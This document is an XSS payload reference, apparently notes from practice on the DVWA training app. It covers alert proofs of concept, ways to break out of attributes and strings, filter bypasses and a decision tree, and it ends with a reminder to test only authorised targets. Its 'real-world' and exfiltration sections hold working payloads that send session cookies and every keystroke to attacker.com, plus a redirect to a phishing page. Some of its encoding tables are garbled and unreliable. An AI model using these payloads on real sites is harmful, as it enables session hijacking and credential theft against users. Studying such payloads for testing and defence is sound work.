# XSS PAYLOAD REFERENCE - Complete Guide

A comprehensive reference of XSS payloads with explanations.

---


## PAYLOAD CATEGORIES

### 1. BASIC PAYLOADS (Start Here)

#### Alert Box (Proof of Concept)
```javascript
<script>alert('XSS')</script>
```
**When:** HTML body context  
**Why:** Simplest way to prove XSS  
**Example:** `?name=<script>alert('XSS')</script>`

---

#### Image Tag with Event Handler
```html
<img src=x onerror="alert('XSS')">
```
**When:** Filters block `<script>` tags  
**Why:** `<img>` often not filtered  
**Example:** `?name=<img src=x onerror="alert('XSS')">`

---

#### SVG Payload
```html
<svg onload="alert('XSS')">
```
**When:** More obscure, less likely to be filtered  
**Why:** Valid HTML tag but different from script  
**Example:** `?name=<svg onload="alert('XSS')">`

---

#### Iframe with JavaScript
```html
<iframe src="javascript:alert('XSS')"></iframe>
```
**When:** DOM-based XSS  
**Why:** Executes JavaScript in URL  
**Example:** `?default=<iframe src="javascript:alert('XSS')">`

---

### 2. ESCAPING HTML ATTRIBUTES

#### Break Out of Attribute
```html
" onmouseover="alert('XSS')" x="
```
**When:** Input inside HTML attribute  
**Why:** Closes attribute with `"`, adds event handler  
**Example:** `<input value="" onmouseover="alert('XSS')" x="">`

---

#### Using Single Quotes
```html
' onmouseover='alert("XSS")' x='
```
**When:** Attribute uses single quotes  
**Why:** Match quote style  
**Example:** `<input value='' onmouseover='alert("XSS")' x=''>`

---

#### No Quotes Required (HTML5)
```html
onmouseover=alert('XSS') x=
```
**When:** Modern browsers allow unquoted attributes  
**Why:** Bypasses quote filtering  
**Example:** `<input onmouseover=alert('XSS')>`

---

### 3. ESCAPING JAVASCRIPT STRINGS

#### Break Out of String
```javascript
"; alert('XSS'); //
```
**When:** Input inside JavaScript string  
**Why:** `"` closes string, `//` comments out rest  
**Example:** In JavaScript: `var name = ""; alert('XSS'); //"`

---

#### Using Single Quote String
```javascript
'; alert('XSS'); //
```
**When:** JavaScript uses single quotes  
**Why:** Match quote style  
**Example:** `var name = ''; alert('XSS'); //'`

---

#### Without String Context
```javascript
alert('XSS')
```
**When:** Already outside string  
**Why:** Direct execution  
**Example:** In DVWA Day 3, direct injection into JS

---

### 4. FILTER BYPASSES

#### Case Manipulation
```html
<ScRiPt>alert('XSS')</sCrIpT>
```
**When:** Filter checks for lowercase `<script>`  
**Why:** Case variation bypasses simple filters  
**Effectiveness:** Low (modern filters case-insensitive)

---

#### Encoding Payload
```html
&lt;script&gt;alert('XSS')&lt;/script&gt;
```
**When:** Already HTML-encoded  
**Why:** Double encoding bypasses single decode  
**Effectiveness:** Rare (dangerous if it works)

---

#### Using Different Tags
```html
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">
<body onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
```
**When:** `<script>` is blocked  
**Why:** Multiple paths to execute JavaScript  
**Effectiveness:** High (many tags available)

---

#### Comment Bypass
```html
<script>/**/alert('XSS')</script>
```
**When:** Filter removes `alert` keyword  
**Why:** Comments split keyword  
**Effectiveness:** Low (modern filters aware)

---

#### URL Encoding Payload

URL: http://dvwa.local/xss_r/?name=%3Cscript%3Ealert('XSS')%3C/script%3E

Decoded: <script>alert('XSS')</script>

**When:** Raw angle brackets rejected by server  
**Why:** URL encoding bypasses input validation  
**Effectiveness:** High (browser auto-decodes)

---

### 5. REAL-WORLD ATTACK PAYLOADS

#### Steal Session Cookies
```html
<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
```
**What it does:** Sends user's cookies to attacker  
**Impact:** Account hijacking  
**Example:** `?name=<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">`

---

#### Redirect to Phishing Site
```html
<script>window.location='http://attacker.com/phish'</script>
```
**What it does:** Redirects user to fake login page  
**Impact:** Credential theft  
**Example:** `?name=<script>window.location='http://evil.com'</script>`

---

#### Deface Page Content
```html
<script>document.body.innerHTML='<h1>HACKED</h1>'</script>
```
**What it does:** Replaces entire page  
**Impact:** Reputation damage  
**Example:** `?name=<script>document.body.innerHTML='DEFACED'</script>`

---

#### Keylogger
```html
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key='+e.key);
}
</script>
```
**What it does:** Records all keystrokes  
**Impact:** Password/data theft  
**Complexity:** Medium

---

### 6. EVENT HANDLERS (Alternative to `<script>`)

These execute JavaScript when something happens:

#### on load/focus events
```html
<img onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
<body onload="alert('XSS')">
```

#### on mouse events
```html
<img onmouseover="alert('XSS')">
<div onmouseenter="alert('XSS')">Hover me</div>
```

#### on error events
```html
<img src=x onerror="alert('XSS')">
<img src=nonexistent.jpg onerror="alert('XSS')">
```

#### on click events
```html
<img onclick="alert('XSS')" src=x>
<div onclick="alert('XSS')">Click me</div>
```

---

### 7. DATA EXFILTRATION TECHNIQUES

#### Simple Alert
```javascript
alert(document.cookie)
```
**Shows:** Current user's session cookie  
**Limitation:** Can't steal from attacker's server  

---

#### Fetch/AJAX Request
```javascript
fetch('http://attacker.com/steal?data='+document.cookie)
```
**Shows:** Cookie sent to attacker  
**Advantage:** Attacker receives data server-side

---

#### Image Beacon
```javascript
new Image().src = 'http://attacker.com/log?cookie=' + document.cookie;
```
**Shows:** Same as fetch, older method  
**Advantage:** Works in older browsers

---

### 8. PAYLOADS BY CONTEXT

#### Inside HTML Body
```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
```

#### Inside HTML Attribute
```html
" onmouseover="alert('XSS')" x="
' onclick='alert("XSS")' x='
onload=alert('XSS') x=
```

#### Inside JavaScript String
```javascript
"; alert('XSS'); //
' + alert('XSS') + '
\u0027); alert('XSS'); //
```

#### Inside URL

```
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

### 9. DVWA-SPECIFIC PAYLOADS (What Worked)

#### Reflected XSS

- Raw: `<script>alert('XSS')</script>`
- URL-Encoded: %3Cscript%3Ealert('XSS')%3C/script%3E
- Used at: http://dvwa.local/vulnerabilities/xss_r/?name=PAYLOAD
- Result: ✓ Alert triggered

#### Stored XSS

- Raw: `<img src=x onerror="alert('Stored XSS')">`
- Submitted: Via form (Name + Message)
- Stored in: Database
- Result: ✓ Alert triggered every page load

#### DOM XSS

- Raw: `<img src=x onerror="alert('DOM XSS')">`
- Injected: Directly in URL parameter
- Processing: JavaScript only (no server)
- Result: ✓ Alert triggered from client-side JS

---

## PAYLOAD SELECTION DECISION TREE
================================


Is input in HTML body?
├─ YES
│  ├─ <script> tag filtered?
│  │  ├─ YES → Try <img src=x onerror="alert()">
│  │  └─ NO → Try <script>alert('XSS')</script>
│  └─ Quote marks in output?
│     └─ Check for encoding
│
├─ Is input in HTML attribute?
│  ├─ YES
│  │  ├─ Uses double quotes?
│  │  │  └─ Use: " onmouseover="alert('XSS')" x="
│  │  └─ Uses single quotes?
│  │     └─ Use: ' onclick='alert("XSS")' x='
│
├─ Is input in JavaScript?
│  ├─ YES
│  │  ├─ Inside string?
│  │  │  ├─ Double quotes → Use: "; alert('XSS'); //
│  │  │  └─ Single quotes → Use: '; alert('XSS'); //
│  │  └─ Direct execution?
│  │     └─ Use: alert('XSS')
│
└─ Is input in URL?
   └─ Use: javascript:alert('XSS')

---

## ENCODING REFERENCE

### URL Encoding

- < = %3C
- = %3E
- " = %22
- ' = %27
- = %20


### HTML Encoding

- < = <
- = >
- " = "
- ' = '
- & = &


### JavaScript Encoding

- " = "
- ' = '
- \ = \
- newline = \n
- tab = \t

---

## QUICK REFERENCE TABLE

| Context | Payload | Example |
|---------|---------|---------|
| HTML Body | `<script>alert()</script>` | `?name=<script>alert('XSS')</script>` |
| HTML Attr | `" onload="alert()` | `value="" onload="alert('XSS')"` |
| JavaScript | `"; alert(); //` | `var x = ""; alert('XSS'); //"` |
| URL | `javascript:alert()` | `<a href="javascript:alert('XSS')">` |
| Filtered | `<img onerror=alert()>` | `?name=<img src=x onerror="alert()">` |

---

## TESTING METHODOLOGY

1. **Start simple:** `<script>alert('XSS')</script>`
2. **If blocked:** Try `<img src=x onerror="alert('XSS')">`
3. **If blocked:** Try `<svg onload="alert('XSS')">`
4. **If blocked:** Try context escape (attribute/string breaks)
5. **If blocked:** Try encoding bypasses
6. **Document what works**

---

## SAFETY REMINDER

✅ **Safe to test:**
- Your own applications
- Bug bounty programs (with permission)
- HackTheBox, DVWA, intentionally vulnerable apps
- Authorized penetration testing engagements

❌ **NOT safe to test:**
- Other people's websites (illegal)
- Applications you don't own
- Without explicit written permission

---

## PAYLOAD SUCCESS INDICATORS

✓ Alert box appeared  
✓ Console shows no errors  
✓ HTML source shows unencoded payload  
✓ Multiple payloads trigger successfully  
✓ Burp shows 200 OK response  

---
